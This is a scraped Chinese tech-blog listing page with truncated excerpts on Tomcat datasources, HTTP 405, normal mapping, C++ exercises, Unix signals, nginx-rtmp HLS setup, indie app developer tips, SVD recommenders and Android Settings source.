相关热门文章 如何做好用户体验度优化？为何...天津二手房市近日开始降温 买...公积金利好二手房价格开始反弹...一个站点有许多种盈利方式...四个例子实战讲解.htaccess文... IP Sec VPN与NAT破镜重圆网站导航UT2.0正式版下载tomcat6.0配置(含配置视频下载...Gomez中国网站用户体验排行榜(... IBM DS3400 盘阵怎么查看是单...启动auditd时，报错如下，怎么...CGSL系统中root密码正确，但无...在CGSL系统中，如何为不同的用...CGSL系统如何设置交换分区的大... 给主人留下些什么吧！~~ 评论热议 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a52d180d381b2bb8ce0be0a18586d856/" rel="bookmark">
			tomcat如何解析resource数据源
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们都知道在tomcat中，可以通过在context.xml中配置resource中用于配置tomcat数据源，如下所示即是一个配置例子。
1 2 3 4 5 6 &lt; Context &gt; &lt; Resource name = "jdbc/xx" auth = "Container" type = "javax.sql.DataSource" password = "mymysql" driverClassName = "com.mysql.jdbc.Driver" username = "root" url = "jdbc:mysql://127.0.0.1/xx" /&gt; &lt;/ Context &gt; 配置了如上的数据源之后，在java代码中，就可以以如下代码进行访问：
1 2 InitialContext initialContext = new InitialContext(); DataSource dataSource = (DataSource) initialContext.lookup( "java:comp/env/jdbc/xx" ); 那么,tomcat是如何将resource中的信息解析成上下文中，并可以通过jndi的方式进行访问呢。这就得从contextResource对象的创建说起。
在NamingContextListener中，namingContext被创建，同时相应的comp上下文和evn上下文被创建起来。然后通过解析context.xml，将最终的jdbc/xx节点绑定在相应的上下文中，并通过解析Resource节点，最终确定数据源对象的创建。
初始namingContext创建
首先我们进入到NamingContextListener对象中，在启动方法，即lifecycleEvent方法中，会初始化根上的namingContext，并将此对象绑定在容器中，并同时绑定在线程上。如下所示：
1 2 3 4 5 6 7 8 9 namingContext = new NamingContext(contextEnv, getName()); //创建根上下文 ContextBindings.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a52d180d381b2bb8ce0be0a18586d856/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a40db1718f7d90f9b1c13a3893cd332e/" rel="bookmark">
			post 405 method not allowed
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		HTTP 405 错误 – 方法不被允许 (Method not allowed) 介绍
HTTP 协议定义一些方法，以指明为获取客户端（如您的浏览器或我们的 CheckUpDown 机器人）所指定的具体网址资源而需要在 Web 服务器上执行的动作。则这些方法如下：
OPTIONS( 选项 ) ：查找适用于一个特定网址资源的通讯选择。 在不需执行具体的涉及数据传输的动作情况下， 允许客户端来确定与资源相关的选项以及 / 或者要求， 或是一个服务器的性能。GET( 获取 ) ：检索由网址资源所确定的信息，如获取一个特定的网页或图片。这是最常用的方法。HEAD( 头 ) ：除了服务器只反馈标头信息而不是网址资源所确定的信息本身外， 基本同于 GET ( 获取 ) 。 可用于获取一个请求所要求的响应实体的元信息 ( metainformation) ，而不需传输响应实体本身。 经常用来测试超文本链接的有效性， 可达性， 和最近的修改。POST( 投寄 ) ：将数据提交到 Web 服务器，如 1 ）在电子公告板，新闻组中，或向 邮件名单发送信息， 2 ）提供输入数据 - 通常由一个公共网关接口(CGI) 表， 到 一个数据处理进程， 3 ）直接将记录添加到一个数据库中。PUT( 放置 ) ：将一个具体网址的数据设置（ 置入 / 替换）成客户提交的新数据。例如，将新的网页上载给服务器。DELETE( 删除 ) ：删除与网址资源相关的数据。例如，删除网页。TRACE( 跟踪 ) ：运行请求信息的一个远程应用层回送。 实际上是一个 'ping', 用以测试 Web 服务器正在从客户端接收什么数据。CONNECT( 连接 ) ：保留以便通过代理服务器和隧道一起使用（如 SSL ）。这种方法只在 HTTP 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a40db1718f7d90f9b1c13a3893cd332e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5aa7a155b60e9c407676db6c5201850/" rel="bookmark">
			写给笨人的法线贴图原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我算个笨人吧.笨人以前弄懂一些东西后,讲给笨人听往往更有效.看之前请自行具备图形学关于光照的基础知识.
&gt;&gt;　world/object space normal map
我们先讲基于世界或模型坐标的法线贴图(world/object space normal map).不常用,但是基础.
首先,请无视你之前google到的所谓通过Photoshop生成法线贴图类似文章,美术除外.那只是一种利用近似hack的手法利用法线贴图原理.无助于理解真正的过程.不过看完这文章后,你应能理解Photoshop的这种做法的来历.
不搞清法线贴图的生成原理,是无法正确理解之后shader中的计算使用的.法线贴图的出现,是为了低面数的模型模拟出高面数的模型的"光照信息".光照信息最重要的当然是光入射方向与入射点的法线夹角.法线贴图本质上就是记录了这个夹角的相关信息.光照的计算与某个面上的法线方向息息相关.
我们知道计算机里的模型,是通过多个多边形面组合来近似模拟一个物体的.它不是圆滑的.面数越多,则越接近真实物体.光照到某个面当中的一点时,法线是通过这个面的几个顶点通过插值得到的.插值其实也是为了模拟这个点"正确"的法线方向,不然整个面所有点的法线一致的话,光照上去,我们看到的模型夸张点就像一面面镜子拼接起来了.但法线插值不可避免的仍然会失真.模型的面数越高,失真的程度自然越小.要是能无限细分到人眼看不出的地步,根本不用插值了.
面数高,需要计算的量和内存需求就高.前辈找到了法线贴图(前身是凹凸贴图)这个办法,使低模能够近似享受高模的光照细节信息.代价是有的,就是需要一个记录这些信息的文件.这是程序中常用的存储空间换计算时间的做法.3D程序中偏爱使用这个手法.谁叫存储硬件的单位价格比计算硬件的单位价格降低速度快很多呢.
显卡包括包括与之相辅的图形api,读的数据最初来源是图片.所以记录这个信息的文件就被我们保存为图片格式.法线贴图后边2个字就这么来的.很好你已经明白一半了.
我们再来弄清另一半.
因为面数少,低模上某个区域的一个面,可能就是高模上相同区域的几个面.看下图的高模与低模的对比(为了简便我们抽象为2维的线段)
上边凹凹凸凸的曲线表示高模.下边比较平滑的表示低模.因为高模细节多,所以在某段区域它的方向变化自然比平平板板的低模多.上图看不懂我表示无能为力.
看到这图,一些人应该有所感觉了.没感觉也不要紧,接下再来.
不管高模还是低模,反正最后还是要被上色的.假设模型已经被渲染完成有颜色了,现在我们想象用剪刀把模型展开(类似给动物扒皮的过程),得到2张差不多一样大小的皮,毕竟面积不会差太多.高模的皮当然肤白体嫩精度高,低模的皮就有些糙了.现在再想象这么个过程:逐渐把高模的皮移到低模的皮上方一定高度直到水平重叠.
现在这个样子你有感觉没有?没感觉也不要紧,接下再来.
虽然模型精度不一样,无论如何,这2张皮每一点都是有颜色了的(插值的功劳).两张皮上相同一点的颜色,高模这张皮上的更真实,因为在计算最终颜色信息所依赖的法线,高模上的点比低模上的点更精确.我们如何给低模这张皮美容,使它能够接近高模的效果呢?换句话说,找到办法,使土肥圆演变为黑木耳,质变为白富美是不可能的,那得下辈子.
办法很暴力.现在再想象你用一根针,从上往下,刺穿高模的皮,再刺到低模的皮.保证针垂直,这样就刺到同一点了.再想象如果这针有魔力的话,它刺穿高模皮的过程中,盗取了一些信息,传送到低模皮上边.低模皮依靠这些信息计算,成功蜕变为黑木耳.这些信息是什么呢?当然是法线信息了.现在高模这张皮被密密麻麻插满了针眼,换句话说,保存高模泄漏来的信息,必定是点对点的.即这张皮上的每个点,都得被保存.所以法线贴图跟原始的贴图是一样大小的,贴图内每个点都保存了对应高模某个点的法线信息.实际的计算,只会关心由贴图里得来的法线信息,低模上的那些法线,被抛弃了.
现在这个样子你有感觉没有?没感觉也不要紧,接下再来.
如何赋予这根针魔力呢?宅男们,甘道夫是帮不了你的忙的.伟哥也帮不了你.只有数学,才能拯救世界...
为什么我之前强调垂直呢?不只是为针能扎到同一点.现在请把这个过程,想象到上图中.图中的箭头,表示高模上某个点的法线方向.如何记录这个方向信息?现在请想象逐渐把高模和低模重叠在一起,为了方便想象,低模小一些被高模包住了.或者你干脆想象高模的面在低模面的正上方,或一个圆球里有一个内切的正多面体.再想象有一束光线(针的等价物),从上往下照射,把高模上的法线投射到低模上.
现在你有感觉了吧.
前戏大功告成,现在我们来处理稍微细节些的问题了.这是一个投影过程.但是影子是2维的啊?向量是由x,y,z三个分量构成的.高模上某点投影到低模上对应点所在平面,只剩2个分量的投影了.好比我们现在只知道法线在x-y平面的投影方向,那在z轴的方向呢?只要我们确保投影前法线是单位向量,那很简单z=1-x*x-y*y.这样我们还可以省下保存z的空间.其实我们既然已经知道这个法线方向(高模object space内的法线方向),而且被单位化了,直接保存也是可以的.投影过程只是个思想实验,实际是不会有什么光线由上到下投射的.
到此可以明确了,"正统"的法线贴图生成,是高模,低模不可缺一的.因为没有高模就不知道法线方向,没有低模,就不知道高模上某点的法线对应于低模上哪个点.
因为某点的法线信息是被保存到法线贴图上对应像素点的.实际计算是把法线x,y,z方向大小映射到颜色空间rgb里.就是把x值存在r里,把y值存在g里,把z值存在b里.因为rgb是8字节为单位的.所以高模的法线信息存储到像素里是要丢失精度的.而且前面计算高模与低模对应点也不可能完全匹配到,本来就是个模拟过程.自然法线贴图也不是无敌的.
现在我们可以回答之前的Photoshop根据diffuse贴图生成法线贴图的问题了.实际的diffuse贴图是根本没有包含模型上的法线信息的.因此它根据diffuse贴图得出的法线贴图根本就是错误的.但为什么能够应用呢?请想象高模的精度高的吓人,高到渲染后把高模皮扒下来后,就成了一张照片.再想象之前高模上的贴图是布满了铁锈.于是你就得到了一张铁锈照片.Photoshop处理这张铁锈照片,其实是根据一些算法(sobel等等)把颜色值转化为梯度值,近似模拟了法线.因为我们其实不关心铁锈的精确分布,像那么一回事就可以了,所以这种情况下如此处理是可以将就的,坑坑洼洼效果最适合如此做法.photoshop这种脱离高模低模的做法容易让人迷惑,导致新手以为法线是从diffuse贴图上来的,或者干脆被阻断了思路.
我们上边计算法线贴图所用到的法线,又是从哪里来的.如果这个法线方向,是处于世界坐标中的(world space),那称为world space normal.如果是处于物体本身局部坐标中的,那称为object space normal.很容易想象,world space normal一旦从贴图里解压出来后,就可以直接用了,效率很高.但是有个缺点,这个world space normal 是固定了,如果物体没有保持原来的方向和位置,那原来生成的normal map就作废了.因此又有人保存了object space normal.它从贴图里解压,还需要乘以model-view矩阵转换到世界坐标,或者转换到其他坐标取决于计算过程及需求.object space normal生成的贴图,物体可以被旋转和位移.基本让人满意.但仍有一个缺点.就是一张贴图只能对应特定的一个模型,模型不能有变形(deform).
&gt;&gt;　tangent space normal map
为解决适应变形的normal map,我们仍能从这两种方法中得到启示.world space normal直接保存的是世界坐标系中的高模法线方向.因此低模取出该点法线就可以直接使用,前提是低模的世界坐标系与高模一致,一点旋转都不能有,不然法线方向就改变了.object space normal保存的是模型空间坐标系中的高模方向,低模取出该点取出来法线,还需要乘以所在的model-view矩阵,转化为低模的世界坐标系中的方向,也就是说低模端还需要做一个运算.因此即使低模任意旋转也不怕,有model-view矩阵可以把法线贴图中的值转换两者效率由高到低,灵活度由低到高.问题来了,我们是否能找到高模上的另外一个坐标系统,使低模变形也时也能较正确的变换法线到世界坐标系中?
我们考察一下object space.当一个低模旋转时,因为是刚体不变形,相当于每个点都乘以一个旋转矩阵R,之后各点关系保持不变.实际上,我们保持物体不旋转,将object space的坐标系(x,y,z三个轴)旋转,得到的结果是一样的.这个关系相信大家都能理解.换句话说,法线针对于object space是固定不动的,物体保持在object space固定,只管跟随坐标系的移动,旋转就行了.现在我们想象低模的某个点需要变形时,那原则上也可以通过让object space坐标系乘以某个变形矩阵T来达到.但是不同的点有不同的变形,不可能存在一个矩阵T即适合这个点又适合这个点.因此object space坐标系是不能用的.会有哪个单一的坐标系能存在一个所有点都共用的变形矩阵吗?显然无法想象.
变形时,顶点关系改变了,即面的形状,方向改变了.如果面上存在一个固定的坐标系,那当物体变形,移动,旋转时,这个坐标系必定跟着面一起运动,那么在这个坐标系里的某个点或向量(比如我们把高模法线转换到这个坐标系里),不需要变动.当整个面发生变化时,我们只需要计算面上的坐标系到世界坐标系的转换矩阵,那么定义在这个面上的点或坐标(固定的),乘以这个矩阵即可得到在世界中的坐标.这个坐标如何构造目前对我们不重要,请务必理解这个概念.我们不过是寻求一个局部坐标系,局部坐标系中的点坐标,乘以局部坐标系到世界坐标系的转换矩阵(这个矩阵是低模渲染时动态计算的的),得到局部坐标系中的点在世界坐标系中的坐标.这样法线贴图中存储的固定的值(法线方向),才能进行有意义的计算.
看到这里很明显的,这种做法需要数千个不同的定义在面上的坐标系.低模上有多少个面,就得有多少个这样的坐标系.这种方法的计算量自然是比object space normal map要大一些的.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f5aa7a155b60e9c407676db6c5201850/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f4d71322ae72d90e290c261dbce1c9d/" rel="bookmark">
			数字游戏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		游戏从一个整数S开始，只要它的位数多于1，就计算它各位的乘积，并且不断重复这个过程。比如：我们从95开始，9 × 5 = 45,45不是1位数，继续4 × 5 = 20.继续2 × 0 = 0.至此只有1位数，结束。
再比如：如果从396开始
3 × 9 × 6 = 162 1 × 6 × 2 = 12 1 × 2 = 2
最后得到2。
Input
每行开始1个整数，表示起始值。最后以0结束。
Output
游戏从开始到结束的序列，从起始值开始。
Sample Input
95
396 28 4 40
0
Sample Output
95 45 20 0
396 162 12 2
28 16 6
4
40 0
#include &lt;iostream&gt;using namespace std;int main(){int s,c,a=1,b,i,n;while(cin&gt;&gt;s){if(s!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7f4d71322ae72d90e290c261dbce1c9d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/849cfa7368fbffce6a5e9e77fc6f4407/" rel="bookmark">
			输入三个整数，按由小到大的顺序输出
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Description 输入三个整数，按由小到大的顺序输出。分别使用指针和引用方式实现两个排序函数。在主函数中输入和输出数据。
Input 三个整数
Output 由小到大输出成一行，每个数字后面跟一个空格。由指针方式实现。
由小到大输出成一行，每个数字后面跟一个空格。由引用方式实现。
Sample Input 2 3 1 Sample Output 1 2 3 1 2 3 HINT 主函数已给定如下，提交时不需要包含下述主函数
/* C++代码 */
int main()
{
void sort1(int *,int *,int *);
void sort2(int &amp;,int &amp;,int &amp;);
int n1,n2,n3;
int *p1,*p2,*p3;
int r1,r2,r3;
cin&gt;&gt;n1&gt;&gt;n2&gt;&gt;n3;
r1=n1;
r2=n2;
r3=n3;
p1=&amp;n1;
p2=&amp;n2;
p3=&amp;n3;
sort1(p1,p2,p3);
cout&lt;&lt;n1&lt;&lt;" "&lt;&lt;n2&lt;&lt;" "&lt;&lt;n3&lt;&lt;endl;
sort2(r1,r2,r3);
cout&lt;&lt;r1&lt;&lt;" "&lt;&lt;r2&lt;&lt;" "&lt;&lt;r3&lt;&lt;endl;
return 0;
}
#include &lt;iostream&gt;using namespace std;void change(int x,int y);void change2(int *x,int *y);int main(){void sort1(int *,int *,int *);void sort2(int &amp;,int &amp;,int &amp;);int n1,n2,n3;int *p1,*p2,*p3;int r1,r2,r3;cin&gt;&gt;n1&gt;&gt;n2&gt;&gt;n3;r1=n1;r2=n2;r3=n3;p1=&amp;n1;p2=&amp;n2;p3=&amp;n3;sort1(p1,p2,p3);cout&lt;&lt;n1&lt;&lt;"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/849cfa7368fbffce6a5e9e77fc6f4407/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/720bc0fc2a3f1e53ba7838234e578aa3/" rel="bookmark">
			使用alarm和pause实现sleep的初级认识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		又有一段时间没写了。。
今天看到一句话，“sleep函数在底层是用alarm和pause实现的”，就上网搜了一下，看了好一会儿才明白是怎么回事。
alarm函数其实就是个定时器，每个进程只能维护一个这样的定时器。这个函数是有返回值的，通常是0，如果在一个alarm还没结束时就调用了另一个alarm，那么第二个alarm会替换第一个，并返回第一个剩下的秒数。
当alarm函数顺利超时时，会发出SIGALRM的信号，如果这个信号没有被捕捉和处理，默认的行为是结束当前调用它的进程，我们在程序中可以使用
signal(SIGALRM, p_handler); 来重新定义受到SIGALRM信号时的行为，其中p_handler是处理函数，看到这个函数的形式我就想是不是其实所有信号都可以这样处理，自己定义，然后一查，果然。 signal函数的原型如下：
void (*signal(int signum,void(* handler)(int)))(int); signum不用说了，肯定是某个信号的编号，这个编号其实有个标准，叫POSIX(portable operating system interface)，X表示是对unix API的传承。这个标准是为在UNIX跑的程序定义的，但是 其他系统也都有实现，不过编号可能不一样，所以这里用的名称常量。 后面的handler是个函数指针，它接收一个int参数，并返回void，实际中可以有三种不同的形式：
1. 无返回值的函数指针。
2.SIG_ING:会忽略掉这个信号。
3.SIG_DFL:表示恢复系统的默认处理。
这样我想怎样实现sleep就有点概念了，先自己定义一个handler，来处理alarm超时之后的SIGALRM信号。由于alarm函数调用后，就像开了一个子线程，主线程会继续往下运行的，所以要加上pause(),让主线程停留在那里就可以了，这样就实现了sleep休息，休息一下的功能。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63d108e7ab12dfdecef1f3522381868d/" rel="bookmark">
			使用Nginx-rtmp-module搭建hls直播
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		HTTP Live Streaming（缩写是 HLS）是一个由苹果公司提出的基于HTTP的流媒体网络传输协议。是苹果公司QuickTime X和iPhone软件系统的一部分。它的工作原理是把整个流分成一个个小的基于HTTP的文件来下载，每次只下载一些。当媒体流正在播放时，客户端可以选择从许多不同的备用源中以不同的速率下载同样的资源，允许流媒体会话适应不同的数据速率。在开始一个流媒体会话时，客户端会下载一个包含元数据的extended M3U (m3u8) playlist文件，用于寻找可用的媒体流。
HLS只请求基本的HTTP报文，与实时传输协议（RTP)不同，HLS可以穿过任何允许HTTP数据通过的防火墙或者代理服务器。它也很容易使用内容分发网络来传输媒体流。
此协议详细内容请参考apple官方网站：https://developer.apple.com/resources/http-streaming/
hls的技术细节就不说了，这里搭建hls直播的目的就是想研究下Nginx-rtmp-module针对rtmp直播流实时转换为hls直播流的基本细节。
经过测试，我发现，rtmp直播流会被动态切分为ts片段和一个不断刷新的u3m8文件，我正需要关注这一点，必要时可能对相关代码进行调试。 这里按顺序分几个部分讲述我的搭建步骤：软件编译，nginx配置，rtmp源的提供，html代码修改，客户端播放 1.软件编译 从下面的网址分别下载nginx和nginx-rtmp-module： http://nginx.org/en/download.html https://github.com/arut/nginx-rtmp-module 我目前的现状是已经安装好了nginx-1.4.4，需要在它的基础上安装这个模块，可以使用下面的方法增加后续的第三方模块。 进入nginx的源码目录下面 ./configure --add-module=/path/to/nginx-rtmp-module --with-http_ssl_module --with-debug 来增加这个模块，然后 make make install 注意新生成的配置文件不会覆盖原来的配置文件。参见下面的截图 可见，在config时已经看到了这个新加入的模块，下面的截图说明，现在Nginx只针对新添加的模块进行编译
由上图可见，在make install时，对原来已经存在的nginx.conf，只会进行原封不动的复制。这一点比较人性化，特别是在线上运维上，这样我们可以任意增加后续模块，然后基于前一次的nginx.conf进行修改就可以了，超赞。
如果是全新安装，就更简单了，这里略去安装步骤。
下面是我的实战记录（注意我原来使用了google perftools模块，所以以后添加的所有模块需要都加上这个编译） cd /usr/local/src git clone https://github.com/arut/nginx-rtmp-module.git cd ../nginx-1.4.4 ./configure --prefix=/usr/local/nginx --with-google_perftools_module --add-module=/usr/local/src/nginx-rtmp-module --with-http_ssl_module --with-debug make make install 2.nginx配置
Nginx可以支持多虚机配置，如果是一个ip或域名多虚机的情况，就是要不同的虚机对应不同的端口服务，而如果是多ip或域名一个虚机的情况，则又不一样。这里的实际情况就是，80和8080分别对应一个http协议的虚机，1935对应一个rtmp协议的虚机。关于hls具体配置项的解释参见
https://github.com/arut/nginx-rtmp-module/wiki/Directives
在原有的nginx.conf中加入如下配置
rtmp { server { listen 1935; chunk_size 4000; #HLS # For HLS to work please create a directory in tmpfs (/tmp/app here) # for the fragments.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/63d108e7ab12dfdecef1f3522381868d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/517bd4cbc78a53d8d60722dc5451b9c6/" rel="bookmark">
			[个人开发者赚钱七］你不能不知道的一些潜规则
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 导语】有云的地方就有天下，有人的地方就有江湖。越是混得好的武林高手，懂的江湖规矩、套路越多；一开口，人家就知道你几斤几两，说得不好听点，新手漂着一股不入流的气息。在任何一个行业，都会生出特定的术语、行话。今天我们就来闲说个人开发者的一些潜规则和行话。 这篇文章，非常重要，关系到个人开发者的切身利益，谨记！ 一、千万不要泄露自己开发的软件的名称、链接等！ 江湖险恶，谨防小人。一定要特别注意不要泄漏自己作品的名称、链接、logo等信息，垃圾软件还好，如果稍微能够赚钱的，就会有打包党打包你的程序，修改包名后，植入广告，再投放到市场。有的恶人会故意给你恶评，导致你的app恶评无数；如果不幸你的产品和他的同类，可能还会恶意刷你app的量，导致你市场的账号被封！这种事真实发生在我身上，当初刚出道，还在群里吆喝让别人给好评，谁知道那个没良心的此后几天恶意刷我app的量，导致安智的账号被封！血的教训啊！ 二、不要在群晒你的收入，特别是你的收入可观！ 群里面，豺狼虎豹，你根本就不了解其他人是干啥的，所以一定要注意切莫装逼。有人喜欢晒自己日收入，少的话人家不稀罕你，如果每天几百，就有人感兴趣啦。一部分是广告平台会注意到你，各种跟你交流，各种利益诱惑，但是往往他们把你弄到他们的平台后，很少再管你死活；另一部分人就更讨厌啦，他们是技术懒惰者，喜欢且擅长厚脸皮山寨反编译你的程序，或者人肉你做什么app，看看是否有copy的可能；还有一部分人是懒得copy你的app，直接打包。晒收入是能体现你自以为牛逼的自我价值，其实真正赚钱的人，懒得晒收入，他们都很忙，像我这种给你们分享的，毛钱都不赚。 三、狡兔三窟，神龙见首不见尾 为了避免自己的app被打包，被别人人肉，一定要注意隐藏自己的身份。就我而言，开发者账户不下5个，用的朋友的身份证。即使人家人肉到我其中的一个身份，也很难知道我还有其他的app，更别说对我了如指掌。平台没固定你只可注册一个开发者账户，就好像国家没限制你只能开一个公司一样，只要法律不限制，且不违背道德的事情，做，没有什么不可以。这个信息时代，任何你私人的信息，都可能暴露在网络中。可能你说，暴露就暴露啊，无所谓，那就错了。假设别人知道你的手机号，然后把你的手机号打印，内容如下："一晚500，面容姣好，请拨打135********"，然后贴到电线杆上、城墙边、公交上，你说你生意能不好嘛？当然更恶劣的行径可能不止这些。 四、一些个人开发者需要了解的概念 刷量、刷榜、刷评论：就是采用软件自动模拟下载、刷软件的评论。 打包：指修改app的包名，重新签名成新的软件，可能还会植入广告。 加固：指对app进行优化，代码重构，以及转移程序入口等，对软件进行保护。 自定义包：自己命名广告的包名。 打包党：专门从事对别人app反编译，重新编译、签名，然后投放到市场的分子。 扣量：指广告平台对你app的广告投放进行后台减量，目的就是少给你点钱。 聚合广告：很多广告平台，聚合的sdk里有很多广告的sdk，可以动态控制使用那一个广告。 抓猫：能够一下子上传到很多市场的平台，需要先绑定各个平台的账号。 umeng：统计用的，便于分析app。 封号：冻结账号。 聪明的你可能会问，我cao，你上面为啥标颜色啊？好吧，我只能说我无聊，打一个SOS的信号。 五、没有不扣量的广告平台，没有全是漂亮妹子的客服 任何开发群，都有广告平台人员出没，他们会向你推他们的平台，说他们的平台什么什么好，作为新手，你千万要冷静。特别是你发现她的qq头像还是美女的时候，你一定要遏制荷尔蒙的分泌，雄性激素让你丧失理智。业界都认为，没有不扣量的平台，不扣你的量，他们怎么活？所以，蛋要定，都被扣量，只是大小问题。还有你会发现很多广告平台的客服都是妹子，而且还是各种漂亮的妹子！程序员们要小心啦！这些都是术，特别是对我们男程序员效果超级好的术。十有八九是男的，如果是女的，也是奔着你的app来，不是奔着你雄壮的体格！ 以上内容，切莫谨记！ 题外话： 我们绝对遵守微价值每增加100人，就分享一篇原创文章得承诺，也希望大家多推荐给微价值给您的程序员朋友，让大家一起进步，谢谢你！ ＝＝＝end====拍我头像可关注我们============ 微信公众帐号vjiazhi 分享移动产品、技术、营销等方面最有价值的信息 关注我们，一起进步，请点击右上角分享给您的朋友！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f1fa01e41ec4688681c60f18af17dfc5/" rel="bookmark">
			推荐系统之改进版SVD
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前的blog（http://blog.csdn.net/ice110956/article/details/21955461 ）简单阐述了基于SVD矩阵分解的隐因子模型。
隐因子模型通过假设一个隐因子空间，通过矩阵分解，得到隐因子空间上的用户-隐因子属性向量，以及物品-隐因子属性向量。再把两个分解后的矩阵相乘，得到满的用户-物品矩阵。以此来推荐。
隐因子模型运用在推荐系统中，相比与简单的协同过滤，其同时考虑了用户聚类，物品聚类，因而效果会好于简单的user-CF或者item-CF。
上篇blog中，简单介绍了基于最优化模型的矩阵分解，以此来求的隐因子空间的方法。三个简单的方法：batch SVD，incomplete incremental SVD和complete incremental SVD。
这里继续阐述另两个改进的SVD-bias SVD 和constraint SVD。
bias-SVD 一般的SVD的最优化目标函数如下：
其中第一项为最小二乘项，后两项为正则化约束，防止过拟合。
第一项中的P，可以简单定义为点乘，如下：
P=Ui’*Mj;
我们知道，每个用户都有不同的打分习惯。比如，A,B两个用户对于电影C都是同样的喜好层度，为3。不过A是一个严格的打分者，他一般倾向于保守打分，于是A给电影C的打分为3-0.5=2.5；而B是一个宽松的打分者，他的分数便为3+0.5=4；
如果我们不考虑上面的因素，就会简单地判断B更喜欢电影C。
于是，我们希望引入一个无偏的喜好度U和M，以及额外的bias偏差变量alfa,beta。用U,M来描述无偏喜好，alfa，beta描述打分宽松度。这样，我们的P函数就可以写成：
如果在加入一个基本分a,公式最终可以写成：
目标函数： 上述为四个变量的凸优化过程，其中关于Ui,Mj的负梯度同completeincremental SVD，而关于alfa，beta的求解如下：
负梯度： 于是我们遍历整个V矩阵，对于已知元素，更新上面四个值；迭代计算，直至收敛。
Constraint SVD SVD是矩阵乘法的方式，得到用户-物品可能喜好度。从数学形式上我们可以看出，隐因子模型同时考虑了用户聚类，物品聚类，用类似聚类的信息填充了这些Miss value。如果某个用户的U-M行过于稀疏，而某个物品M-U不稀疏，（这种情况是常见的）。那么Miss value的填充很大程度上取决于这个物品的属性，最后得到近似于这个物品的平均值。
也就是，在用户，物品信息不平衡的情况下，我们容易减少用户对于喜好的影响程度。如下的contraint SVD一定程度上解决了这个问题。
我们重新定义U矩阵，如下：
其中Y表示用户的无偏喜好，I为已知元素的索引，W为一个大小=物品矩阵M-factor的矩阵。
我们可以看出，对于不同的用户，只要他们购买相同的物品，那么后一项就会完全一样。以此来进一步刻画用户特征。
对于稀疏的用户行为，后一项相当于预先填充了用户矩阵。
目标函数： 其中
负梯度方向： 算法优化：
上面的负梯度中，我们可以看出，每次计算时，对于同一用户来说，这一行的目标值，都具有相同的一项，于是我们可以考虑以行为单位，记录中间重复计算的项，以此简化计算。
下一篇blog继续这两个SVD的组合体- compound SVD，以及其具体的编程实现
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/66b6a4727897e53faf5669f65ab4ae79/" rel="bookmark">
			Android Settings开发之修改
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		版本：1.0 日期：2014.3.20 2014.3.25 版权：© 2014 kince 转载注明出处 下面是Seeings应用的截图： 可以看出这是很典型的使用了Fragment后的界面，设置里面有WIFI、蓝牙、显示、存储、应用等众多功能。左边的每一项，对应着右边的一个设置界面，Fragment有四个子类：DialogFragment, ListFragment, PreferenceFragment, WebViewFragment。很明显，Settings用的是PreferenceFragment。接着看一下Settings源码package结构： 主题部分的实现主要在com.android.settings下面，其他包主要是用于各自功能实现，所以重点说这个包下面的类。在AndroidManifest.xml文字中，看到程序入口是Settings类： 打开Settings类，是继承于PreferenceActivity： 其他的继承关系如下：PreferenceActivity--&gt;ListActivity --&gt; Activity。PreferenceActivity主要用于Settings，关于如何使用可以参考API（http://developer.android.com/reference/android/preference/PreferenceActivity.html）以及guide（http://developer.android.com/guide/topics/ui/settings.html）。和它相关联的类有header、fragment、preference。每一个header就是左边的一个选项条目，像蓝牙、应用等，选择之后右边就会显示对应的fragment（平板），然后fragment和preference联系在一起，组成了一个个设置项。一般在activity中设置布局，用的是setContentView()，在PreferenceActivity中，是需要继承onBuildHeaders(List)这个方法， @Override public void onBuildHeaders(List&lt;Header&gt; target) { loadHeadersFromResource(R.xml.preference_headers, target); } 去生成选项表，点击选项表的一个条目，右边显示对应的Fragment，这就是很典型的header+fragment组合，所以如果想在Settings基础之上添加条目的话，在这个方法里面的xml文件中添加即可，然后对应上fragment。下面分析一下执行流程： 首先进入onCreate(Bundle savedInstanceState)方法里面，代码如下： @Override protected void onCreate(Bundle savedInstanceState) { if (getIntent().getBooleanExtra(EXTRA_CLEAR_UI_OPTIONS, false)) { getWindow().setUiOptions(0); } mAuthenticatorHelper = new AuthenticatorHelper(); mAuthenticatorHelper.updateAuthDescriptions(this); 